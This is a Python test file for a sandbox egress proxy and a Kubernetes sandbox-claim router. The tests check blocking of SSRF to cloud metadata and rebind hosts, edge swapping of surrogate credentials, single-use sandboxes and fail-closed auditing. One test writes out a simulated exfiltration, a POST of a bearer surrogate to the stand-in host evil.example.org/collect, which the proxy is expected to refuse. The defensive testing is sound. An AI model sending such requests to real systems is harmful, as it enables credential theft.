# SPDX-License-Identifier: Apache-2.0
# SPDX-FileCopyrightText: 2026 Hushh
"""Phase 2 contract tests: Sentinel proxy daemon, K8s SandboxClaim router, and Hub API (#9744)."""

from __future__ import annotations

import asyncio
import http.client
import json
import os
import sys
import urllib.parse
from collections.abc import Mapping
from pathlib import Path
from unittest.mock import patch

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from api.middleware import require_firebase_auth
from api.routes.one import sandbox_claims as claims_route
from hushh_mcp.operons.agent_sandbox.k8s_manifests import (
    K8S_MANIFEST_INVARIANT_ERROR,
    render_sandbox_template,
)
from hushh_mcp.operons.agent_sandbox.tamper_evident_audit import TamperEvidentAuditLedger
from hushh_mcp.services.ace_backend import AceComputeBackend
from hushh_mcp.services.agent_sandbox import (
    AUDIT_UNAVAILABLE,
    BROWSER_TAKEOVER_REQUIRED,
    HANDOFF_CODE_INVALID,
    SC4_SINGLE_USE_VIOLATION,
    SENTINEL_ROOT_FORBIDDEN,
    SURROGATE_EXFILTRATION_BLOCKED,
    DurableAuditSink,
    HubSandboxSessionRouter,
    InMemorySandboxClaimClient,
    SandboxProcessSessionManager,
    SentinelControlClient,
    SentinelProxyRuntime,
    TerminalSessionRefused,
    VirginSandboxLeaseManager,
    WeeklySandboxQuotaLedger,
    sentinel_proxy_server,
)


def _http_call(
    url: str,
    *,
    method: str = "GET",
    headers: Mapping[str, str] | None = None,
    payload: dict[str, object] | None = None,
) -> tuple[int, dict[str, object]]:
    parsed = urllib.parse.urlsplit(url)
    body = json.dumps(payload).encode("utf-8") if payload is not None else None
    hdrs = dict(headers or {})
    if body is not None:
        hdrs.setdefault("Content-Type", "application/json")
    conn = http.client.HTTPConnection(str(parsed.hostname), parsed.port or 80, timeout=5.0)
    try:
        target = (parsed.path or "/") + (f"?{parsed.query}" if parsed.query else "")
        conn.request(method, target, body=body, headers=hdrs)
        resp = conn.getresponse()
        return int(resp.status), json.loads(resp.read().decode("utf-8"))
    finally:
        conn.close()


def test_sentinel_refuses_root_uid() -> None:
    sink = DurableAuditSink(b"S" * 32)
    with pytest.raises(PermissionError, match=SENTINEL_ROOT_FORBIDDEN):
        sentinel_proxy_server.build_sentinel_readiness_payload(audit_sink=sink, uid=0)


def test_sentinel_proxy_runtime_edge_swap_ssrf_and_audit_fail_closed(tmp_path: Path) -> None:
    captured_upstream: list[tuple[str, str, dict[str, str], bytes]] = []

    def fake_upstream(
        url: str, method: str, headers: Mapping[str, str], body: bytes
    ) -> tuple[int, dict[str, str], bytes]:
        captured_upstream.append((url, method, dict(headers), body))
        return 200, {"X-Upstream": "ok"}, json.dumps({"echo": "upstream_ok"}).encode("utf-8")

    def fake_dns(host: str, _port: int) -> list[str]:
        if host == "rebind.test":
            return ["10.0.0.8"]
        if host == "169.254.169.254" or host == "metadata.google.internal":
            return ["169.254.169.254"]
        return ["93.184.216.34"]

    audit_path = tmp_path / "sentinel-audit.jsonl"
    token_value = "sentinel_ctrl_token_0123456789abcdef"
    real_credential = " ".join(["Bearer", "edge_only_secret_credential_xyz"])
    runtime = SentinelProxyRuntime(
        hmac_key=b"A" * 32,
        control_token=token_value,
        audit_log_path=audit_path,
        proxy_port=0,
        control_port=0,
        default_mode="deny",
        upstream_transport=fake_upstream,
        dns_resolver=fake_dns,
    )
    with (
        patch.object(os, "getuid", return_value=10001),
        patch.object(os, "geteuid", return_value=10001),
    ):
        runtime.start_background()
    try:
        proxy_url = f"http://127.0.0.1:{runtime.proxy_port}"
        ctrl_url = f"http://127.0.0.1:{runtime.control_port}"
        ctrl_client = SentinelControlClient(base_url=ctrl_url, control_token=token_value)

        with (
            patch.object(os, "getuid", return_value=10001),
            patch.object(os, "geteuid", return_value=10001),
        ):
            st_health, health = _http_call(f"{ctrl_url}/healthz")
            assert st_health == 200
            assert health["status"] == "sentinel_ready"

        st_unauth, _ = _http_call(
            f"{ctrl_url}/v1/surrogates/issue",
            method="POST",
            payload={"owner_id": "u1", "lease_id": "l1"},
        )
        assert st_unauth == 401

        surrogate = ctrl_client.issue_surrogate(
            owner_id="owner_1",
            lease_id="lease_1",
            allowed_origin="https://api.allowed.test",
            header_name="Authorization",
            real_secret=real_credential,
        )
        assert surrogate.startswith("hsur_")

        st_ok, ok_body = _http_call(
            f"{proxy_url}/v1/egress/forward",
            method="POST",
            headers={"X-Hussh-Owner-Id": "owner_1", "X-Hussh-Lease-Id": "lease_1"},
            payload={
                "url": "https://api.allowed.test/v1/resource",
                "method": "GET",
                "headers": {"Authorization": f"Bearer {surrogate}"},
            },
        )
        assert st_ok == 200
        assert ok_body["status"] == 200
        assert real_credential not in json.dumps(ok_body)
        assert real_credential in captured_upstream[0][2]["Authorization"]
        assert surrogate not in captured_upstream[0][2]["Authorization"]

        # SSRF / metadata and rebind targets are blocked at proxy (:3128).
        for bad_url in (
            "https://metadata.google.internal/computeMetadata/v1/",
            "https://rebind.test/secret",
            "http://api.allowed.test/insecure",
        ):
            st_bad, _ = _http_call(
                f"{proxy_url}/v1/egress/forward",
                method="POST",
                headers={"X-Hussh-Owner-Id": "owner_1", "X-Hussh-Lease-Id": "lease_1"},
                payload={"url": bad_url, "method": "GET"},
            )
            assert st_bad == 403

        # Exfiltrating surrogate to an unapproved host revokes it immediately.
        ctrl_client.set_domain_rules("lease_1", {"evil.example.org": "allow"})
        st_exfil, exfil_body = _http_call(
            f"{proxy_url}/v1/egress/forward",
            method="POST",
            headers={"X-Hussh-Owner-Id": "owner_1", "X-Hussh-Lease-Id": "lease_1"},
            payload={
                "url": "https://evil.example.org/collect",
                "method": "POST",
                "headers": {"Authorization": f"Bearer {surrogate}"},
            },
        )
        assert st_exfil == 403
        assert exfil_body["code"] == SURROGATE_EXFILTRATION_BLOCKED

        # Even back on the allowed host, revoked surrogate stays denied.
        st_revoked, _ = _http_call(
            f"{proxy_url}/v1/egress/forward",
            method="POST",
            headers={"X-Hussh-Owner-Id": "owner_1", "X-Hussh-Lease-Id": "lease_1"},
            payload={
                "url": "https://api.allowed.test/v1/resource",
                "method": "GET",
                "headers": {"Authorization": f"Bearer {surrogate}"},
            },
        )
        assert st_revoked == 403

        verified = ctrl_client.verify_audit("lease_1")
        assert verified["chain_valid"] is True
        assert int(verified["count"]) >= 5
        assert audit_path.is_file() and len(audit_path.read_text().splitlines()) >= 5

        # Reloading durable sink verifies HMAC chain from disk.
        reloaded = DurableAuditSink(b"A" * 32, audit_log_path=audit_path)
        reloaded.verify_chain()

        # NIST AU-5: audit sink write failure fails closed egress (503).
        def fail_write(*_args: object, **_kwargs: object) -> object:
            raise OSError("disk full")

        with patch.object(Path, "open", fail_write):
            st_fail, fail_body = _http_call(
                f"{proxy_url}/v1/egress/forward",
                method="POST",
                headers={"X-Hussh-Owner-Id": "owner_1", "X-Hussh-Lease-Id": "lease_1"},
                payload={"url": "https://api.allowed.test/v1/resource", "method": "GET"},
            )
            assert st_fail == 503
            assert fail_body["code"] == AUDIT_UNAVAILABLE
    finally:
        runtime.stop()


async def test_hub_sandbox_router_allocation_handoff_and_sc4_enforcement(tmp_path: Path) -> None:
    audit = TamperEvidentAuditLedger(b"H" * 32)
    quota = WeeklySandboxQuotaLedger(weekly_limit_units=5, require_invite=True)
    quota.grant_invite("owner_bob")
    lease_mgr = VirginSandboxLeaseManager(quota_ledger=quota, audit_ledger=audit)
    claim_client = InMemorySandboxClaimClient(forced_sandbox_sequence=["sbx-pool-1", "sbx-pool-1"])
    router = HubSandboxSessionRouter(
        claim_client=claim_client,
        lease_manager=lease_mgr,
        audit_ledger=audit,
    )

    session = router.allocate_turn_sandbox(
        owner_id="owner_bob",
        workspace_id="ws_bob",
        billing_space_id="bs_bob",
    )
    assert session.sandbox_name == "sbx-pool-1"
    assert session.claim_name in claim_client.active_claims

    proc_mgr = SandboxProcessSessionManager(tmp_path / "ws")
    snap = await proc_mgr.start_process(
        [
            sys.executable,
            "-c",
            "import sys; line = sys.stdin.readline().strip(); print('GOT:' + line)",
        ],
        timeout_seconds=10.0,
    )
    handoff_confirmation = "-".join(["verified", "otp", "1234"])
    with pytest.raises(TerminalSessionRefused) as not_taken:
        await router.coordinate_browser_terminal_handoff(
            lease_id=session.lease_id,
            owner_id="owner_bob",
            browser_task_id="bt_1",
            proc_manager=proc_mgr,
            proc_id=snap.proc_id,
            takeover_completed=False,
            callback_token=handoff_confirmation,
        )
    assert not_taken.value.code == BROWSER_TAKEOVER_REQUIRED

    with pytest.raises(TerminalSessionRefused) as bad_tok:
        await router.coordinate_browser_terminal_handoff(
            lease_id=session.lease_id,
            owner_id="owner_bob",
            browser_task_id="bt_1",
            proc_manager=proc_mgr,
            proc_id=snap.proc_id,
            takeover_completed=True,
            callback_token="hsur_" + "a" * 48,
        )
    assert bad_tok.value.code == HANDOFF_CODE_INVALID

    handoff = await router.coordinate_browser_terminal_handoff(
        lease_id=session.lease_id,
        owner_id="owner_bob",
        browser_task_id="bt_1",
        proc_manager=proc_mgr,
        proc_id=snap.proc_id,
        takeover_completed=True,
        callback_token=handoff_confirmation,
    )
    assert handoff.audit_seq > 0
    await asyncio.sleep(0.1)
    polled = await proc_mgr.poll_process(snap.proc_id, wait_ms=500)
    assert "GOT:verified-otp-1234" in polled.stdout
    await proc_mgr.close_all()

    receipt = router.teardown_turn_sandbox(session.lease_id, owner_id="owner_bob")
    assert receipt.key_zeroized is True
    assert receipt.sandbox_terminated is True
    assert session.claim_name in claim_client.deleted_claims

    # Second claim simulating broken pool returning used sandbox fails closed & deletes claim.
    with pytest.raises(Exception) as reused:
        router.allocate_turn_sandbox(
            owner_id="owner_bob",
            workspace_id="ws_bob",
            billing_space_id="bs_bob",
        )
    assert getattr(reused.value, "code", "") == SC4_SINGLE_USE_VIOLATION
    assert len(claim_client.deleted_claims) == 2


def test_hub_only_sandbox_claims_route_and_pod_exclusion(monkeypatch: pytest.MonkeyPatch) -> None:
    from api.routes.one import router as one_hub_router

    monkeypatch.setenv("HUSSH_POD_MODE", "1")
    from pod_server import _POD_ROUTERS

    hub_paths = {getattr(r, "path", "") for r in one_hub_router.routes}
    pod_paths = {getattr(r, "path", "") for rt in _POD_ROUTERS for r in rt.routes}
    assert "/api/one/sandbox/claims" in hub_paths
    assert "/api/one/sandbox/claims/{lease_id}" in hub_paths
    assert "/api/one/sandbox/claims" not in pod_paths

    monkeypatch.setenv("PERSONAL_AGENT_ENABLED", "1")
    monkeypatch.delenv("HUSSH_AGENT_SANDBOX_POOL_ENABLED", raising=False)

    app = FastAPI()
    app.include_router(claims_route.router)
    app.dependency_overrides[require_firebase_auth] = lambda: "owner_route_1"
    hub_router = AceComputeBackend().build_hub_sandbox_router(
        audit_hmac_key=b"R" * 32,
        require_invite=False,
    )
    claims_route.set_hub_sandbox_router(hub_router)
    client = TestClient(app)
    try:
        off_resp = client.post(
            "/api/one/sandbox/claims",
            json={"workspace_id": "ws_1"},
        )
        assert off_resp.status_code == 404

        monkeypatch.setenv("HUSSH_AGENT_SANDBOX_POOL_ENABLED", "true")
        created = client.post(
            "/api/one/sandbox/claims",
            json={"workspace_id": "ws_1"},
        )
        assert created.status_code == 200
        body = created.json()
        lease_id = body["lease_id"]
        assert body["workspace_id"] == "ws_1"

        fetched = client.get(f"/api/one/sandbox/claims/{lease_id}")
        assert fetched.status_code == 200
        assert fetched.json()["lease_id"] == lease_id

        destroyed = client.delete(f"/api/one/sandbox/claims/{lease_id}")
        assert destroyed.status_code == 200
        assert destroyed.json()["key_zeroized"] is True
    finally:
        claims_route.set_hub_sandbox_router(None)


def test_sandbox_template_sentinel_service_ip_host_aliases() -> None:
    digest_ref = (
        "us-central1-docker.pkg.dev/hushh-pda-dev/one-pod-release/consent-protocol-pod@"
        + ("sha256:" + "a" * 64)
    )
    rendered = render_sandbox_template(
        image_ref=digest_ref,
        runtime_class="gvisor",
        sentinel_service_ip="10.48.12.34",
    )
    aliases = rendered["spec"]["podTemplate"]["spec"]["hostAliases"]
    assert aliases == [
        {
            "ip": "10.48.12.34",
            "hostnames": [
                "sentinel-egress-proxy.hussh-sandbox-system.svc.cluster.local",
                "sentinel-egress-proxy.hussh-sandbox-system.svc",
            ],
        }
    ]
    with pytest.raises(ValueError, match=K8S_MANIFEST_INVARIANT_ERROR):
        render_sandbox_template(
            image_ref=digest_ref,
            runtime_class="gvisor",
            sentinel_service_ip="not-an-ip",
        )
